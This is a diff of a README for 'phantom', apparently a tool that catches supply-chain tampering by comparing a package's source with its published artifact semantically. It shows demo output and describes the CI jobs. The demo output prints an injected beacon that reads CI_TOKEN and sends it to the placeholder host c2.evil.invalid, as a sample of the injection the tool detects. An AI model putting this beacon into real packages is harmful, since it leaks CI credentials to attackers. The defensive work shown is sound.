@@ -32,6 +32,41 @@ The point: none of the injected code is flagged for *looking* malicious. It is
 flagged because it is not in the source. That is what catches clean, obfuscated,
 or never-before-seen injection.
 
+## Seeing a caught attack
+
+`run_all.py` prints, for every scenario, the raw textual difference between the
+source and the published artifact, then phantom's verdict on it. The contrast is
+the whole demo:
+
+```
+=== phantom-span (pypi) ===
+difference (naive text diff of source vs published artifact):
+    @@ -4,3 +4,14 @@
+    +def _beacon():
+    +    token = os.environ.get("CI_TOKEN", "")
+    +    urllib.request.urlopen("https://c2.evil.invalid/beacon?t=" + token)
+    +_beacon()
+phantom: 2 finding(s), highest severity critical
+  [CRITICAL] phantom_span mylib/core.py:9-14
+    vectors: network:urllib.request, env-read:os.environ
+```
+
+And on `clean`, the naive diff still shows changes (a maintainer reformatted the
+file), but phantom reports **nothing**, because its comparison is semantic
+(AST-normalized), not textual:
+
+```
+=== clean (pypi) ===
+difference (naive text diff of source vs published artifact):
+    +# distributed build of mylib.core (comments and spacing differ ...)
+    -    return "hello, " + name
+    +    return "hello, " + name  # build the greeting
+phantom: no findings (artifact matches source)
+```
+
+That is the difference between a text diff (noisy, easy to hide in) and
+phantom's verdict (semantic, hard to hide from).
+
 ## Run it locally
 
 ```bash
@@ -64,8 +99,12 @@ tool uses to add new ecosystems.
 
 ## CI
 
-- **`scenarios`** installs `phantom-scan==0.2.0` and runs `run_all.py`. Green
-  means phantom's verdicts still match the documented outcomes.
+- **`scenarios`** installs `phantom-scan==0.2.0`, runs `run_all.py` (printing
+  every difference and phantom's verdict), then runs one tampered scenario
+  through the CLI to show phantom exiting non-zero: the log demonstrates what a
+  real CI gate looks like when it catches a divergence.
 - **`verify-deps`** runs the `pipebreach/phantom@v0.2.0` Action against
-  `phantom-scan==0.2.0` itself and uploads SARIF. Green means the Action
-  integrates and the dependency's artifact matches its source.
+  `phantom-scan==0.2.0` itself and uploads SARIF. This is the trusted-dependency
+  case: green means the Action integrates and the artifact matches its source.
+  The injected-attack side is demonstrated by the controlled scenarios above,
+  which do not depend on publishing a malicious package to a real registry.
